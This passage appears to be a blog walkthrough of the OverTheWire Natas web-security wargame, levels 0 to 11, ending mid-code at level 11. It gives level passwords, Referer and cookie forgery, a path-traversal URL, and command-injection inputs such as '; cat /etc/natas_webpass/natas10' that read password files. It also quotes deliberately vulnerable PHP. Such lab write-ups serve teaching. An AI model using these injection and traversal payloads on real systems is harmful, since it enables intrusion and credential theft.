<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _________________________________________
</span><span class='line'>/ Better hope the life-inspector doesn't  \
</span><span class='line'>| come around while you have your life in |
</span><span class='line'>\ such a mess.                            /
</span><span class='line'> -----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[OverTheWire: Natas]]></title>
    <link href="http://chousensha.github.io/blog/2015/11/30/overthewire-natas/"/>
    <updated>2015-11-30T04:50:00-05:00</updated>
    <id>http://chousensha.github.io/blog/2015/11/30/overthewire-natas</id>
    <content type="html"><![CDATA[<p>Natas teaches the basics of serverside web-security.</p>

<p>Each level of natas consists of its own website located at **<a href="http://natasX.natas.labs.overthewire.org**,">http://natasX.natas.labs.overthewire.org**,</a> where X is the level number. There is no SSH login. To access a level, enter the username for that level (e.g. natas0 for level 0) and its password.</p>

<p>Each level has access to the password of the next level. Your job is to somehow obtain that next password and level up. All passwords are also stored in <strong>/etc/natas_webpass/</strong>. E.g. the password for natas5 is stored in the file /etc/natas_webpass/natas5 and only readable by natas4 and natas5.</p>

<p>Start here:</p>

<p>Username: natas0</p>

<p>Password: natas0</p>

<p>URL:      <a href="http://natas0.natas.labs.overthewire.org">http://natas0.natas.labs.overthewire.org</a></p>

<!-- more -->


<h3>Level 0</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas0.png" title="natas0" alt="natas 0"></p>

<p>Look in the source for the following comment:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="c">&lt;!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto --&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<h3>Level 1</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas1.png" title="natas1" alt="natas 1"></p>

<p>You can still view the page source from the URL:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>view-source:http://natas1.natas.labs.overthewire.org/</span></code></pre></td></tr></table></div></figure>


<p>Again, the password is in a comment:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="c">&lt;!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi --&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<h3>Level 2</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas2.png" title="natas2" alt="natas 2"></p>

<p>In the source you will see a directory path that you can navigate to:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">&quot;files/pixel.png&quot;</span><span class="nt">&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Go to <a href="http://natas2.natas.labs.overthewire.org/files/">http://natas2.natas.labs.overthewire.org/files/</a> and you will see a directory listing. Chech the users.txt file:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># username:password
</span><span class='line'>alice:BYNdCesZqW
</span><span class='line'>bob:jw2ueICLvT
</span><span class='line'>charlie:G5vCxkVV3m
</span><span class='line'>natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
</span><span class='line'>eve:zo4mJWyNj2
</span><span class='line'>mallory:9urtcpzBmH</span></code></pre></td></tr></table></div></figure>


<h3>Level 3</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas2.png" title="natas3" alt="natas 3"></p>

<p>There is a comment in the source again:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="c">&lt;!-- No more information leaks!! Not even Google will find it this time... --&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Well, since they mentioned Google, let&rsquo;s look for a robots.txt file..If you go to <a href="http://natas3.natas.labs.overthewire.org/robots.txt">http://natas3.natas.labs.overthewire.org/robots.txt</a> , you will see the following line: <code>Disallow: /s3cr3t/</code>. Navigate to <a href="http://natas3.natas.labs.overthewire.org/s3cr3t/">http://natas3.natas.labs.overthewire.org/s3cr3t/</a> and there is another users.txt file: <code>natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ</code></p>

<h3>Level 4</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas4.png" title="natas4" alt="natas 4"></p>

<p>If our access is permitted based on the Referer header, all we have to do is change it. I used Live HTTP Headers for the task. Changed the Referer, refreshed the page and: <code>Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq</code></p>

<h3>Level 5</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas5.png" title="natas5" alt="natas 5"></p>

<p>So how do they determine if I&rsquo;m logged in? A cookie maybe..I used Firebug to look at cookies, and indeed there is a loggedin cookie with the value of 0. Changed it to 1 and <code>Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</code></p>

<h3>Level 6</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas6.png" title="natas6" alt="natas 6"></p>

<p>This time we are also given the backend source code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span>
</span><span class='line'>
</span><span class='line'><span class="k">include</span> <span class="s2">&quot;includes/secret.inc&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;submit&quot;</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="nv">$secret</span> <span class="o">==</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;secret&#39;</span><span class="p">])</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">print</span> <span class="s2">&quot;Access granted. The password for natas7 is &lt;censored&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">print</span> <span class="s2">&quot;Wrong secret&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>That include directive stands out. If you go to <a href="http://natas6.natas.labs.overthewire.org/includes/secret.inc">http://natas6.natas.labs.overthewire.org/includes/secret.inc</a> you get a blank page. But the source is not so blank:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span>
</span><span class='line'><span class="nv">$secret</span> <span class="o">=</span> <span class="s2">&quot;FOEIUWGHFEEUHOFUOIU&quot;</span><span class="p">;</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>Enter it in the form and <code>Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9</code></p>

<h3>Level 7</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas7.png" title="natas7" alt="natas 7"></p>

<p>Inside the source there&rsquo;s a comment:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="c">&lt;!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 --&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Going to the Home and About pages, nothing interesting jumps out. However, combining the hint with how the URL looks like, I thought about local file inclusion. The normal URL is <a href="http://natas7.natas.labs.overthewire.org/index.php?page=home">http://natas7.natas.labs.overthewire.org/index.php?page=home</a> and I tried to read the password file by changing it to <a href="http://natas7.natas.labs.overthewire.org/index.php?page=../../../../../../etc/natas_webpass/natas8">http://natas7.natas.labs.overthewire.org/index.php?page=../../../../../../etc/natas_webpass/natas8</a> . And it worked! The password is <code>DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe</code></p>

<h3>Level 8</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas6.png" title="natas8" alt="natas 8"></p>

<p>We have to look at PHP source code again:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$encodedSecret</span> <span class="o">=</span> <span class="s2">&quot;3d3d516343746d4d6d6c315669563362&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">encodeSecret</span><span class="p">(</span><span class="nv">$secret</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">return</span> <span class="nb">bin2hex</span><span class="p">(</span><span class="nb">strrev</span><span class="p">(</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$secret</span><span class="p">)));</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;submit&quot;</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nx">encodeSecret</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;secret&#39;</span><span class="p">])</span> <span class="o">==</span> <span class="nv">$encodedSecret</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">print</span> <span class="s2">&quot;Access granted. The password for natas9 is &lt;censored&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">print</span> <span class="s2">&quot;Wrong secret&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>So it&rsquo;s looking for a string that matches the end result of all these conversions. Instead, we can reverse the process and decrypt the encoded secret to its original value.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># hex to binary 
</span><span class='line'>3d3d516343746d4d6d6c315669563362 becomes 00111101 00111101 01010001 01100011 01000011 01110100 01101101 01001101 01101101 01101100 00110001 01010110 01101001 01010110 00110011 01100010 
</span><span class='line'>
</span><span class='line'># binary to ascii
</span><span class='line'>00111101 00111101 01010001 01100011 01000011 01110100 01101101 01001101 01101101 01101100 00110001 01010110 01101001 01010110 00110011 01100010  becomes ==QcCtmMml1ViV3b
</span><span class='line'>
</span><span class='line'># reverse
</span><span class='line'>==QcCtmMml1ViV3b becomes b3ViV1lmMmtCcQ==
</span><span class='line'>
</span><span class='line'># final base64 decode
</span><span class='line'>b3ViV1lmMmtCcQ== becomes oubWYf2kBq</span></code></pre></td></tr></table></div></figure>


<p>Input <code>oubWYf2kBq</code> in the form and you will get <code>Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl</code></p>

<h3>Level 9</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas9.png" title="natas9" alt="natas 9"></p>

<p>If you enter something, the backend greps for that word in a dictionary file:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span>
</span><span class='line'><span class="nv">$key</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;needle&quot;</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$key</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;needle&quot;</span><span class="p">];</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nv">$key</span> <span class="o">!=</span> <span class="s2">&quot;&quot;</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="nb">passthru</span><span class="p">(</span><span class="s2">&quot;grep -i </span><span class="si">$key</span><span class="s2"> dictionary.txt&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>So I thought to terminate the first command and chain another one, that would read the password: <code>; cat /etc/natas_webpass/natas10</code>. And the password is output, along with the entire file: <code>nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu</code></p>

<h3>Level 10</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas10.png" title="natas10" alt="natas 10"></p>

<p>This level is the same as the last, except now there is some filtering in place:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span>
</span><span class='line'><span class="nv">$key</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;needle&quot;</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$key</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;needle&quot;</span><span class="p">];</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nv">$key</span> <span class="o">!=</span> <span class="s2">&quot;&quot;</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/[;|&amp;]/&#39;</span><span class="p">,</span><span class="nv">$key</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">print</span> <span class="s2">&quot;Input contains an illegal character!&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>        <span class="nb">passthru</span><span class="p">(</span><span class="s2">&quot;grep -i </span><span class="si">$key</span><span class="s2"> dictionary.txt&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>This filtering doesn&rsquo;t exclude all characters that could be useful. If you read the <em>grep</em> manpage, you will come across this section:</p>

<blockquote><p>Anchoring
The caret ^ and the dollar sign $ are meta-characters that respectively  match the empty string at the beginning and end of a line.</p></blockquote>

<p>So I went ahead and tried <code>^ cat /etc/natas_webpass/natas11</code>, and the password was output, along with the rest of the file. This worked because <em>grep</em> returned every line containing the string that matches the beginning of the line (or end if you use $). I just added the password file for <em>grep</em> to read</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
</span><span class='line'>dictionary.txt:
</span><span class='line'>dictionary.txt:African
</span><span class='line'>dictionary.txt:Africans
</span><span class='line'>dictionary.txt:Allah
</span><span class='line'>dictionary.txt:Allah's
</span><span class='line'>dictionary.txt:American
</span><span class='line'>dictionary.txt:Americanism
</span><span class='line'>dictionary.txt:Americanism's
</span><span class='line'>dictionary.txt:Americanisms
</span><span class='line'>dictionary.txt:Americans
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<h3>Level 11</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas11.png" title="natas11" alt="natas 11"></p>

<p>The backend code is more complicated:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$defaultdata</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span> <span class="s2">&quot;showpassword&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;no&quot;</span><span class="p">,</span> <span class="s2">&quot;bgcolor&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;#ffffff&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">xor_encrypt</span><span class="p">(</span><span class="nv">$in</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$key</span> <span class="o">=</span> <span class="s1">&#39;&lt;censored&gt;&#39;</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">$text</span> <span class="o">=</span> <span class="nv">$in</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">$outText</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// Iterate through each character</span>
</span><span class='line'>    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$text</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$outText</span> <span class="o">.=</span> <span class="nv">$text</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">^</span> <span class="nv">$key</span><span class="p">[</span><span class="nv">$i</span> <span class="o">%</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$key</span><span class="p">)];</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="nv">$outText</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">loadData</span><span class="p">(</span><span class="nv">$def</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">global</span> <span class="nv">$_COOKIE</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">$mydata</span> <span class="o">=</span> <span class="nv">$def</span><span class="p">;</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;data&quot;</span><span class="p">,</span> <span class="nv">$_COOKIE</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$tempdata</span> <span class="o">=</span> <span class="nb">json_decode</span><span class="p">(</span><span class="nx">xor_encrypt</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s2">&quot;data&quot;</span><span class="p">])),</span> <span class="k">true</span><span class="p">);</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$tempdata</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;showpassword&quot;</span><span class="p">,</span> <span class="nv">$tempdata</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;bgcolor&quot;</span><span class="p">,</span> <span class="nv">$tempdata</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/^#(?:[a-f\d]{6})$/i&#39;</span><span class="p">,</span> <span class="nv">$tempdata</span><span class="p">[</span><span class="s1">&#39;bgcolor&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span><span class='line'>        <span class="nv">$mydata</span><span class="p">[</span><span class="s1">&#39;showpassword&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$tempdata</span><span class="p">[</span><span class="s1">&#39;showpassword&#39;</span><span class="p">];</span>
</span><span class='line'>        <span class="nv">$mydata</span><span class="p">[</span><span class="s1">&#39;bgcolor&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$tempdata</span><span class="p">[</span><span class="s1">&#39;bgcolor&#39;</span><span class="p">];</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">return</span> <span class="nv">$mydata</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">saveData</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="nx">setcookie</span><span class="p">(</span><span class="s2">&quot;data&quot;</span><span class="p">,</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nx">xor_encrypt</span><span class="p">(</span><span class="nb">json_encode</span><span class="p">(</span><span class="nv">$d</span><span class="p">))));</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$data</span> <span class="o">=</span> <span class="nx">loadData</span><span class="p">(</span><span class="nv">$defaultdata</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;bgcolor&quot;</span><span class="p">,</span><span class="nv">$_REQUEST</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/^#(?:[a-f\d]{6})$/i&#39;</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;bgcolor&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span><span class='line'>        <span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;bgcolor&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;bgcolor&#39;</span><span class="p">];</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="nx">saveData</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'>
</span><span class='line'><span class="cp">&lt;?</span>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s2">&quot;showpassword&quot;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;yes&quot;</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">print</span> <span class="s2">&quot;The password for natas12 is &lt;censored&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>Well, looking at the page, we see a <em>data</em> cookie that&rsquo;s base64 encoded, but decoding it gives rubbish because it&rsquo;s XOR encrypted. The PHP code operates on it. We can also set the background color by giving it a valid value.</p>

<p>Now for the code! Breaking it down:</p>

<ul>
<li><p>The default data is an array comprised of the values <em>showpassword</em> set to no and <em>bgcolor</em> set to #ffffff</p></li>
<li><p>The xor_encrypt function performs XOR encryption on the given input</p></li>
<li><p>The loadData function loads the data from the cookie, or keeps the default values if the data is invalid.</p></li>
<li><p>The saveData function sets the cookie&rsquo;s value by the process of  <code>JSON encode &ndash;> XOR encrypt &ndash;> base64 encode</code></p></li>
</ul>


<p>At the end, we can see that if <em>showpassword</em> is set to yes, the password for the next level will be displayed. To achieve this, we have to mirror the cookie creation process, and change that value accordingly. But we don&rsquo;t have the key used for the XOR encryption. However, we know that in XOR encryption, <code>original xor key = encrypted</code>, and the following also applies: <code>original xor encrypted = key</code>. Because we have both the original data and the encrypted version, we can recover the key!</p>

<p>I kept the original code since it does all the work, and only made some modifications to the variables:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
